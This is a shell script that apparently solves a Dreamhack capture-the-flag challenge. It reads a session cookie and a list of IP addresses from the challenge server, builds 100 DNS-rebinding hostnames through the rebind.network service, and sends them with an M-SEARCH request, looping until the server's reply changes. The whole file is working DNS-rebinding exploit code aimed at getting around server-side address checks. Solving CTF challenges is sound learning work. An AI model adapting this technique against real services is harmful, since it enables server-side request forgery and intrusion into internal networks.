#!/bin/sh

function exploit(){
    url="http://host1.dreamhack.games:10228/"
    #url="http://172.17.0.2:8888/"
    res=$(curl -i $(printf ${url} && printf "start"))
    session=$(echo ${res} | cut -d " " -f 14)

    ips=()
    for i in {4..202..2}
    do
        ips+=($(echo ${res} | cut -d "\"" -f ${i}))
    done

    random=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13)

    domains=()
    
    for i in {0..99}
    do
        dns=$(printf "A." && printf ${ips[i]} && printf ".1time." && printf ${ips[i]} && printf ".1time.repeat." && printf ${random} && printf ".rebind.network")
        domains+=(${dns})
    done

    function makeDomains(){
        for i in {0..98}
        do
            printf "domains[]=" 
            printf ${domains[i]}
            printf "&"
        done
        printf "domains[]=" 
        printf ${domains[99]}
    }

    echo $(curl -X "M-SEARCH" -H "Cookie: ${session}" $(echo $(printf ${url} && printf "?" && makeDomains)))
}

while true
do
    res=$(exploit)
    echo ${res}
    if [[ "$res" != "cheer up !" ]];then
        echo ${res}
        break
    fi

done